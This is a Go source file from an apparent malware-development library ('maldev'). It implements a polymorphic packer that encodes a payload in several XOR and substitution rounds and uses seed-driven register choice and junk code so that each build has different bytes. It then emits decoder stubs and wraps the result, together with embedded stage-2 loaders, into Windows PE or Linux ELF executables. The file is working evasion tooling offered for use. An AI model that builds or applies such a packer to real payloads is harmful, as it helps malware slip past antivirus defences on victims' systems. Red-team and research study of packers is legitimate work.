package stubgen

import (
	_ "embed"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"

	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
	"github.com/oioio-space/maldev/pe/packer/stubgen/host"
	"github.com/oioio-space/maldev/pe/packer/stubgen/poly"
	"github.com/oioio-space/maldev/pe/packer/stubgen/stage1"
)

// HostFormat selects which output format Generate produces.
type HostFormat uint8

const (
	// HostFormatPE emits a Windows PE32+ executable (Phase 1e-A).
	// Zero value preserves backward compatibility for all 1e-A callers
	// that leave Options.HostFormat unset.
	HostFormatPE HostFormat = 0
	// HostFormatELF emits a Linux ELF64 static-PIE (Phase 1e-B).
	HostFormatELF HostFormat = 1
)

// String returns the canonical lowercase format name.
func (h HostFormat) String() string {
	switch h {
	case HostFormatPE:
		return "pe"
	case HostFormatELF:
		return "elf"
	default:
		return fmt.Sprintf("hostformat(%d)", uint8(h))
	}
}

// Sentinels.
var (
	// ErrInvalidRounds fires when Options.Rounds is outside [1, 10].
	ErrInvalidRounds = errors.New("stubgen: rounds out of range")
	// ErrPayloadTooLarge fires when the inner blob exceeds the 100 MB
	// safety cap. The cap prevents accidental enormous PE generation.
	ErrPayloadTooLarge = errors.New("stubgen: encoded payload exceeds budget")
	// ErrEncodingSelfTestFailed fires when the Go reference decoder
	// cannot recover the original inner bytes from the encoded form.
	// This catches substitution / key aliasing bugs before deployment.
	ErrEncodingSelfTestFailed = errors.New("stubgen: encoding self-test failed")
	// ErrNoStage2Variant fires when no committed stage-2 binary is
	// available. Should not occur in a correctly built module.
	ErrNoStage2Variant = errors.New("stubgen: no stage-2 variant available")
	// ErrStage2SentinelMissing fires when PatchStage2 cannot locate the
	// 16-byte sentinel in the provided stage-2 binary.
	ErrStage2SentinelMissing = errors.New("stubgen: stage-2 binary missing payload sentinel")
	// ErrUnsupportedHostFormat fires when Generate / PickStage2Variant
	// receives an unknown HostFormat value.
	ErrUnsupportedHostFormat = errors.New("stubgen: unsupported host format")
)

// stage2V01PE is the committed Phase 1e-A stage-2 loader binary (Windows PE32+).
// Embedded at build time; operators never rebuild it unless they are
// maintainers regenerating the stubvariants set.
//
//go:embed stubvariants/stage2_v01.exe
var stage2V01PE []byte

// stage2V01ELF is the committed Phase 1e-B stage-2 loader binary (Linux ELF64 static-PIE).
// Built from the same cross-platform stage2_main.go with -buildmode=pie.
//
//go:embed stubvariants/stage2_linux_v01
var stage2V01ELF []byte

// variantsPE holds all committed PE stage-2 binaries. Future variants
// (v02..v08) are appended here and in the go:embed directives when
// committed. The packer selects deterministically via seed % len.
var variantsPE = [][]byte{stage2V01PE}

// variantsELF holds all committed ELF stage-2 binaries (parallel to variantsPE).
var variantsELF = [][]byte{stage2V01ELF}

// sentinel must match the byte sequence in stubvariants/stage2_main.go
// exactly. If they diverge, PatchStage2 finds the sentinel at pack-time
// but the running stage-2 finds nothing, causing an immediate exit.
//
// Value: "MALDEV\x01\x01PY1E00A\x00"
var sentinel = [16]byte{
	0x4D, 0x41, 0x4C, 0x44, 0x45, 0x56, 0x01, 0x01,
	0x50, 0x59, 0x31, 0x45, 0x30, 0x30, 0x41, 0x00,
}

// Options parameterizes Generate.
type Options struct {
	// Inner is the blob to encode: stage-2 patched with payload + key.
	// Callers that want the full end-to-end pipeline should use
	// PatchStage2 to build this value before calling Generate.
	Inner []byte
	// Rounds is the number of SGN encoding rounds, 1..10.
	// Higher values increase the decoder stub size (and therefore the
	// .text section of the output PE) but have diminishing per-round
	// byte-uniqueness returns beyond ~5.
	Rounds int
	// Seed drives the poly engine's register allocation, substitution
	// choice, and junk insertion. Two calls with distinct seeds on the
	// same Inner produce distinct output bytes (Hamming distance ≥ 25%
	// in the .text section). Zero means crypto-random.
	Seed int64
	// HostFormat selects the output container format. Zero value
	// (HostFormatPE) preserves Phase 1e-A behavior for existing callers.
	HostFormat HostFormat
}

const maxInnerSize = 100 * 1024 * 1024 // 100 MB safety cap

// Generate produces a runnable host binary wrapping a polymorphic
// stage-1 decoder and the multi-round-encoded Inner blob. The output
// format is determined by opts.HostFormat (default HostFormatPE).
//
// Pipeline:
//  1. poly.NewEngine encodes Inner through Rounds XOR rounds.
//  2. A Go-side self-test (selfTestRoundTrip) verifies the encoding.
//  3. stage1.Emit writes one decoder loop per round; the outermost
//     round (rounds[N-1]) is emitted first so it executes first at
//     runtime, peeling the outermost encoding layer.
//  4. host.EmitPE / host.EmitELF wraps the stage-1 bytes and encoded
//     payload blob in the requested container format.
func Generate(opts Options) ([]byte, error) {
	if opts.Rounds < 1 || opts.Rounds > 10 {
		return nil, fmt.Errorf("%w: rounds=%d", ErrInvalidRounds, opts.Rounds)
	}
	if len(opts.Inner) > maxInnerSize {
		return nil, fmt.Errorf("%w: inner=%d max=%d", ErrPayloadTooLarge, len(opts.Inner), maxInnerSize)
	}

	eng, err := poly.NewEngine(opts.Seed, opts.Rounds)
	if err != nil {
		return nil, fmt.Errorf("stubgen: NewEngine: %w", err)
	}
	encoded, rounds, err := eng.EncodePayload(opts.Inner)
	if err != nil {
		return nil, fmt.Errorf("stubgen: EncodePayload: %w", err)
	}

	// Pre-deploy self-test: catches substitution/key-aliasing bugs before the
	// operator ships a binary that silently fails to decode at runtime.
	if !selfTestRoundTrip(encoded, rounds, opts.Inner) {
		return nil, ErrEncodingSelfTestFailed
	}

	// Emit decoder loops outermost-first so they execute in reverse order at
	// runtime, peeling each encoding layer in the correct sequence.
	// The "payload" label is declared before the loops so the RIP-relative LEA
	// in each loop has a valid branch target; the LEA displacement is a
	// placeholder (disp=0) — full patching is a Phase 1e-B concern.
	b, err := amd64.New()
	if err != nil {
		return nil, fmt.Errorf("stubgen: amd64.New: %w", err)
	}
	_ = b.Label("payload")
	for i := opts.Rounds - 1; i >= 0; i-- {
		loopLabel := fmt.Sprintf("loop_%d", i)
		if err := stage1.Emit(b, rounds[i], loopLabel, "payload", len(encoded)); err != nil {
			return nil, fmt.Errorf("stubgen: stage1.Emit round %d: %w", i, err)
		}
	}
	stage1Bytes, err := b.Encode()
	if err != nil {
		return nil, fmt.Errorf("stubgen: amd64.Encode: %w", err)
	}

	switch opts.HostFormat {
	case HostFormatPE:
		out, err := host.EmitPE(host.PEConfig{
			Stage1Bytes: stage1Bytes,
			PayloadBlob: encoded,
		})
		if err != nil {
			return nil, fmt.Errorf("stubgen: host.EmitPE: %w", err)
		}
		return out, nil
	case HostFormatELF:
		out, err := host.EmitELF(host.ELFConfig{
			Stage1Bytes: stage1Bytes,
			PayloadBlob: encoded,
		})
		if err != nil {
			return nil, fmt.Errorf("stubgen: host.EmitELF: %w", err)
		}
		return out, nil
	default:
		return nil, fmt.Errorf("%w: %s", ErrUnsupportedHostFormat, opts.HostFormat)
	}
}

// PickStage2Variant returns one of the committed stage-2 binaries for
// the requested format, chosen deterministically from seed. With one
// variant per format today the selection is trivial; future variants
// (v02..v08) make the seed meaningful.
func PickStage2Variant(seed int64, format HostFormat) ([]byte, error) {
	switch format {
	case HostFormatPE:
		if len(variantsPE) == 0 {
			return nil, ErrNoStage2Variant
		}
		return variantsPE[uint64(seed)%uint64(len(variantsPE))], nil
	case HostFormatELF:
		if len(variantsELF) == 0 {
			return nil, ErrNoStage2Variant
		}
		return variantsELF[uint64(seed)%uint64(len(variantsELF))], nil
	default:
		return nil, fmt.Errorf("%w: %s", ErrUnsupportedHostFormat, format)
	}
}

// PatchStage2 locates the sentinel in the stage-2 binary and appends a
// trailer carrying the payload and key lengths followed by the payload
// and key bytes themselves. The trailer format is:
//
//	[u64 LE payloadLen] [u64 LE keyLen] [payload bytes] [key bytes]
//
// The stage-2 binary, at runtime, locates the sentinel via its own
// byte-search, then reads lengths and data from the immediately
// following bytes. Both sentinel searches must see the SAME sentinel
// value — kept in sync by the sentinel variable above.
func PatchStage2(stage2, payload, key []byte) ([]byte, error) {
	if findSentinel(stage2) < 0 {
		return nil, ErrStage2SentinelMissing
	}
	out := make([]byte, 0, len(stage2)+16+len(payload)+len(key))
	out = append(out, stage2...)
	var hdr [16]byte
	binary.LittleEndian.PutUint64(hdr[0:8], uint64(len(payload)))
	binary.LittleEndian.PutUint64(hdr[8:16], uint64(len(key)))
	out = append(out, hdr[:]...)
	out = append(out, payload...)
	out = append(out, key...)
	return out, nil
}

// findSentinel returns the index of the first byte of the sentinel in
// haystack, or -1 if not found. bytes.Index uses SIMD / Rabin-Karp on
// modern Go, which is faster than a hand-rolled O(n×16) inner loop.
func findSentinel(haystack []byte) int {
	return bytes.Index(haystack, sentinel[:])
}

// selfTestRoundTrip is the Go-side reference decoder. It applies each
// round's Subst.Decode in reverse order (outermost layer first) and
// checks that the result matches the original bytes.
//
// Using Subst.Decode rather than a hardcoded XOR keeps this in sync with
// each variant's algebraic inverse regardless of which substitution the
// engine chose for that round.
func selfTestRoundTrip(encoded []byte, rounds []poly.Round, original []byte) bool {
	if len(encoded) != len(original) {
		return false
	}
	dec := append([]byte(nil), encoded...)
	for i := len(rounds) - 1; i >= 0; i-- {
		subst := rounds[i].Subst
		k := rounds[i].Key
		for j := range dec {
			dec[j] = subst.Decode(dec[j], k)
		}
	}
	return bytes.Equal(dec, original)
}
